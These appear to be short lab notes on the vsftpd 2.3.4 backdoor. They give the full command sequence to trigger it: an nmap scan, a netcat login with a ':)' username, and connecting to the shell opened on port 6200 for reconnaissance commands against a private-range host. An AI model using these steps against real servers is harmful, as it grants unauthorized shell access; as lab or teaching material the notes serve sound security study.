- The `vsftpd 2.3.4` backdoor bug is a *deliberate vulnerability introduced* into vsftpd version 2.3.4 (a popular FTP software). This vulnerability allows opening a hidden shell port when the username contains the character `:)`.
- Check if FTP is opeing
```shell
nmap -sV -p 21 192.168.42.138
```
- Use netcat
```shell
nc 192.168.42.138 21
```
- Then type in
```shell
USER test:)
PASS anything
```
- If the server fails, it will silently open a shell on port 6200, we can access shell now
```shell
nc 192.168.42.138 6200

whoami
id
uname -a
```